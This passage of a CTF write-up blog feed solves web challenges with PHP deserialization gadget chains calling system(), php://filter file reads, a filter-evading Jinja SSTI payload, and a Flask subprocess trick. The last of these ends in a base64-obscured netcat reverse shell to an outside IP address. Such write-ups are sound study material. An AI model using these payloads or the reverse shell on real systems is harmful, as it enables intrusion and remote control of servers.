class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE_<span class="number">_</span>);</span><br><span class="line"></span><br><span class="line">class Begin&#123;</span><br><span class="line">    public <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[a-zA-Z0-9]/&quot;</span>,<span class="variable">$this-</span><span class="built_in">&gt;name</span>))&#123;</span><br><span class="line">            echo <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            echo <span class="string">&quot;Welcome to NewStarCTF 2023!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Then&#123;</span><br><span class="line">    public <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        (<span class="variable">$this-</span>&gt;func)();  //<span class="variable">$this-</span>&gt;func=new 类名();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Good Job!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Handle&#123;</span><br><span class="line">    public <span class="variable">$obj</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __call(<span class="variable">$func</span>, <span class="variable">$vars</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        echo <span class="string">&quot;call&quot;</span>;</span><br><span class="line">        <span class="variable">$this-</span>&gt;obj-&gt;<span class="keyword">end</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Super&#123;</span><br><span class="line">    public <span class="variable">$obj</span>;</span><br><span class="line">    public <span class="keyword">function</span> __invoke()  //  字母数字()</span><br><span class="line">    &#123;</span><br><span class="line">        echo <span class="string">&quot;invoke&quot;</span>;</span><br><span class="line">        <span class="variable">$this-</span>&gt;obj-&gt;getStr();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="keyword">end</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        die(<span class="string">&quot;==GAME OVER==&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class CTF&#123;</span><br><span class="line">    public <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> <span class="keyword">end</span>()</span><br><span class="line">    &#123;</span><br><span class="line">        echo <span class="string">&quot;end&quot;</span>;</span><br><span class="line">        unset(<span class="variable">$this-</span>&gt;handle-&gt;log);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class WhiteGod&#123;</span><br><span class="line">    public <span class="variable">$func</span>;</span><br><span class="line">    public <span class="variable">$var</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __unset(<span class="variable">$var</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        (<span class="variable">$this-</span>&gt;func)(<span class="variable">$this-</span>&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = new Begin();</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span> = new Then();</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span>-&gt;func = new Super();</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span>-&gt;func-&gt;obj = new Handle();</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span>-&gt;func-&gt;obj-&gt;obj = new CTF();</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span>-&gt;func-&gt;obj-&gt;obj-&gt;handle = new WhiteGod();</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span>-&gt;func-&gt;obj-&gt;obj-&gt;handle-&gt;func=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$a-</span><span class="built_in">&gt;name</span>-&gt;func-&gt;obj-&gt;obj-&gt;handle-&gt;var=<span class="string">&#x27;cat /flag&#x27;</span>;</span><br><span class="line">echo urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line">//O<span class="meta">%3A5</span><span class="meta">%3A</span><span class="meta">%22Begin</span><span class="meta">%22</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22name</span><span class="meta">%22</span><span class="meta">%3BO</span><span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22Then</span><span class="meta">%22</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22func</span><span class="meta">%22</span><span class="meta">%3BO</span><span class="meta">%3A5</span><span class="meta">%3A</span><span class="meta">%22Super</span><span class="meta">%22</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A3</span><span class="meta">%3A</span><span class="meta">%22obj</span><span class="meta">%22</span><span class="meta">%3BO</span><span class="meta">%3A6</span><span class="meta">%3A</span><span class="meta">%22Handle</span><span class="meta">%22</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A3</span><span class="meta">%3A</span><span class="meta">%22obj</span><span class="meta">%22</span><span class="meta">%3BO</span><span class="meta">%3A3</span><span class="meta">%3A</span><span class="meta">%22CTF</span><span class="meta">%22</span><span class="meta">%3A1</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A6</span><span class="meta">%3A</span><span class="meta">%22handle</span><span class="meta">%22</span><span class="meta">%3BO</span><span class="meta">%3A8</span><span class="meta">%3A</span><span class="meta">%22WhiteGod</span><span class="meta">%22</span><span class="meta">%3A2</span><span class="meta">%3A</span><span class="meta">%7Bs</span><span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22func</span><span class="meta">%22</span><span class="meta">%3Bs</span><span class="meta">%3A6</span><span class="meta">%3A</span><span class="meta">%22system</span><span class="meta">%22</span><span class="meta">%3Bs</span><span class="meta">%3A3</span><span class="meta">%3A</span><span class="meta">%22var</span><span class="meta">%22</span><span class="meta">%3Bs</span><span class="meta">%3A4</span><span class="meta">%3A</span><span class="meta">%22ls</span>+<span class="meta">%2F</span><span class="meta">%22</span><span class="meta">%3B</span><span class="meta">%7D</span><span class="meta">%7D</span><span class="meta">%7D</span><span class="meta">%7D</span><span class="meta">%7D</span><span class="meta">%7D</span></span><br></pre></td></tr></table></figure><h2 id="GenShin">GenShin</h2><p>过滤了双{，使用{和%绕过，这里是直接用了之前某次ssti的exp直接getshell了</p><figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%print(<span class="name">config</span>|attr(<span class="string">&quot;_&quot;</span><span class="string">&quot;_cla&quot;</span><span class="string">&quot;ss_&quot;</span><span class="string">&quot;_&quot;</span>)|attr(<span class="string">&quot;_&quot;</span><span class="string">&quot;_in&quot;</span><span class="string">&quot;it_&quot;</span><span class="string">&quot;_&quot;</span>)|attr(<span class="string">&quot;_&quot;</span><span class="string">&quot;_glo&quot;</span><span class="string">&quot;bals_&quot;</span><span class="string">&quot;_&quot;</span>)|attr(<span class="string">&quot;_&quot;</span><span class="string">&quot;_get&quot;</span><span class="string">&quot;item_&quot;</span><span class="string">&quot;_&quot;</span>)(<span class="string">&quot;o&quot;</span><span class="string">&quot;s&quot;</span>)|attr(<span class="string">&quot;po&quot;</span><span class="string">&quot;pen&quot;</span>)(<span class="string">&quot;ls&quot;</span>)|attr(<span class="string">&quot;re&quot;</span><span class="string">&quot;ad&quot;</span>)())%&#125;</span><br></pre></td></tr></table></figure><h2 id="R-C-E">R!!!C!!!E!!!</h2><p>应该可以盲注，这里使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>=<span class="string">&quot;cat /flag_is_h3eeere|script result1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;qwejaskdjnlka = <span class="keyword">new</span> <span class="title function_ invoke__">minipop</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="OtenkiGirl">OtenkiGirl</h2><p>猜个原型链污染，学ing</p>]]></content>
    
    
    <summary type="html">新手赛，感谢主办方</summary>
    
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/categories/CTF/"/>
    
    <category term="比赛WP" scheme="https://bowuchuling.github.io/categories/CTF/%E6%AF%94%E8%B5%9BWP/"/>
    
    
    <category term="CTF" scheme="https://bowuchuling.github.io/tags/CTF/"/>
    
    <category term="WP" scheme="https://bowuchuling.github.io/tags/WP/"/>
    
  </entry>
  
  <entry>
    <title>SHCTF WEB WP</title>
    <link href="https://bowuchuling.github.io/posts/54fkfh75.html"/>
    <id>https://bowuchuling.github.io/posts/54fkfh75.html</id>
    <published>2023-10-15T09:13:18.233Z</published>
    <updated>2023-10-17T02:25:11.611Z</updated>
    
    <content type="html"><![CDATA[<h1>SHCTF WEEK2</h1><h2 id="WEEK2-serialize">[WEEK2]serialize</h2><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">misca</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$gao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fei</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">miaomiao</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;gao=<span class="variable language_">$this</span>-&gt;fei;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">miaomiao</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;Mikey Mouse~&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">musca</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ding</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dong</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ding-&gt;dong;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">milaoshu</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span><span class="string">&quot;misca~musca~milaoshu~~~&quot;</span>;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;v);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^O:\d+/&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;you should think harder!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">check</span>(<span class="variable">$_GET</span>[<span class="string">&quot;wanna_fl.ag&quot;</span>]));</span><br></pre></td></tr></table></figure><p>这里反序列化头可以用数组绕过，然后用引用绕过miaomiao()方法</p><p>exp如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">misca</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$gao</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$fei</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">musca</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ding</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">milaoshu</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v</span>=<span class="string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">musca</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;ding = <span class="keyword">new</span> <span class="title function_ invoke__">misca</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;ding-&gt;a = &amp;<span class="variable">$a</span>-&gt;ding-&gt;gao;</span><br><span class="line"><span class="variable">$a</span>-&gt;ding-&gt;fei = <span class="keyword">new</span> <span class="title function_ invoke__">milaoshu</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">?</span><span class="variable">wanna</span><span class="punctuation">[</span><span class="variable">fl</span><span class="operator">.</span><span class="variable">ag</span><span class="operator">=</span><span class="variable">a</span><span class="operator">:</span><span class="number">1</span><span class="operator">:</span><span class="punctuation">&#123;</span><span class="variable">i</span><span class="operator">:</span><span class="number">0</span><span class="operator">;</span><span class="built_in">O</span><span class="operator">:</span><span class="number">5</span><span class="operator">:</span><span class="string">&quot;musca&quot;</span><span class="operator">:</span><span class="number">1</span><span class="operator">:</span><span class="punctuation">&#123;</span><span class="variable">s</span><span class="operator">:</span><span class="number">4</span><span class="operator">:</span><span class="string">&quot;ding&quot;</span><span class="operator">;</span><span class="built_in">O</span><span class="operator">:</span><span class="number">5</span><span class="operator">:</span><span class="string">&quot;misca&quot;</span><span class="operator">:</span><span class="number">3</span><span class="operator">:</span><span class="punctuation">&#123;</span><span class="variable">s</span><span class="operator">:</span><span class="number">3</span><span class="operator">:</span><span class="string">&quot;gao&quot;</span><span class="operator">;</span><span class="built_in">N</span><span class="operator">;</span><span class="variable">s</span><span class="operator">:</span><span class="number">3</span><span class="operator">:</span><span class="string">&quot;fei&quot;</span><span class="operator">;</span><span class="built_in">O</span><span class="operator">:</span><span class="number">8</span><span class="operator">:</span><span class="string">&quot;milaoshu&quot;</span><span class="operator">:</span><span class="number">1</span><span class="operator">:</span><span class="punctuation">&#123;</span><span class="variable">s</span><span class="operator">:</span><span class="number">1</span><span class="operator">:</span><span class="string">&quot;v&quot;</span><span class="operator">;</span><span class="variable">s</span><span class="operator">:</span><span class="number">52</span><span class="operator">:</span><span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span><span class="operator">;</span><span class="punctuation">&#125;</span><span class="variable">s</span><span class="operator">:</span><span class="number">1</span><span class="operator">:</span><span class="string">&quot;a&quot;</span><span class="operator">;</span><span class="variable">R</span><span class="operator">:</span><span class="number">4</span><span class="operator">;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="WEEK2-no-wake-up">[WEEK2]no_wake_up</h2><p>源码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username = <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;try&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>fast_destruct 绕过wakeup，exp如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">flag</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;username=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">try</span>=O:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;admin&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;code&quot;</span>;s:<span class="number">52</span>:<span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;</span><br></pre></td></tr></table></figure><h2 id="WEEK2-ez-rce">[WEEK2]ez_rce</h2><p>源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gett</span>(<span class="params">obj, arg</span>):</span><br><span class="line">    tmp = obj</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        tmp = <span class="built_in">getattr</span>(tmp, i)</span><br><span class="line">        <span class="built_in">print</span>(tmp)</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sett</span>(<span class="params">obj, arg, num</span>):</span><br><span class="line">    tmp = obj</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arg) - <span class="number">1</span>):</span><br><span class="line">        tmp = <span class="built_in">getattr</span>(tmp, arg[i])</span><br><span class="line">    <span class="built_in">setattr</span>(tmp, arg[i + <span class="number">1</span>], num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hint</span>(<span class="params">giveme, num, bol</span>):</span><br><span class="line">    c = gett(subprocess, giveme)</span><br><span class="line">    tmp = <span class="built_in">list</span>(c)</span><br><span class="line">    tmp[num] = bol</span><br><span class="line">    tmp = <span class="built_in">tuple</span>(tmp)</span><br><span class="line">    sett(subprocess, giveme, tmp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">arg</span>):</span><br><span class="line">    subprocess.call(arg)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exec</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> request.args.get(<span class="string">&#x27;exec&#x27;</span>) == <span class="string">&#x27;ok&#x27;</span>:</span><br><span class="line">            shell = request.args.get(<span class="string">&#x27;shell&#x27;</span>)</span><br><span class="line">            cmd(shell)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            exp = <span class="built_in">list</span>(request.get_json()[<span class="string">&#x27;exp&#x27;</span>])</span><br><span class="line">            num = <span class="built_in">int</span>(request.args.get(<span class="string">&#x27;num&#x27;</span>))</span><br><span class="line">            bol = <span class="built_in">bool</span>(request.args.get(<span class="string">&#x27;bol&#x27;</span>))</span><br><span class="line">            hint(exp, num, bol)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;ok&#x27;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>注意点：</p><p>1.这里的subprocess.call的shell属性默认为false，只能执行单个命令</p><p>2.call和run等函数一样，他们都是使用Popen进行封装的，运行时都会调用这个，参考https://blog.csdn.net/wzj_110/article/details/116612425</p><p>3.使用__defaults__方法是可以获得某函数或者类内的所有属性</p><p>总体思路就是找到Popen里面的shell属性，将其修改为true，进而让call执行多段命令</p><p>一阶段payload如下:</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">GET:</span></span><br><span class="line">?<span class="attr">num</span><span class="operator">=</span><span class="number">7</span><span class="variable">&amp;bol</span>=<span class="number">1</span></span><br><span class="line"><span class="symbol"></span></span><br><span class="line"><span class="symbol">POST:</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="string">&quot;exp&quot;</span>:<span class="punctuation">&#123;</span><span class="string">&quot;Popen&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="string">&quot;__init__&quot;</span>:<span class="string">&quot;123&quot;</span>,<span class="string">&quot;__defaults__&quot;</span>:<span class="string">&quot;123&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>二阶段payload如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">exec</span>=ok&amp;shell=`echo <span class="attribute">bmMgMTEwLjQxLjE3LjE4MyAyNTAgLWUgL2Jpbi9zaA</span>== | base64 -d`</span><br></pre></td></tr></table></figure><h2 id="WEEK2-MD5的事就拜托了">[WEEK2]MD5的事就拜托了</h2><p>源码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span 